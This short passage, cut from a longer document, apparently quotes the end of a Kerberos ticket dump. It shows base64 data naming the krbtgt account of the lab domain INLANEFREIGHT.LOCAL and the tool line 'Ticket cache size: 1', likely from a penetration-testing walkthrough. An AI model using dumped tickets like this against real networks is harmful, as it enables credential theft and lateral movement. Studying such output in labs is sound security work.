JTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM

[*] Ticket cache size: 1
```



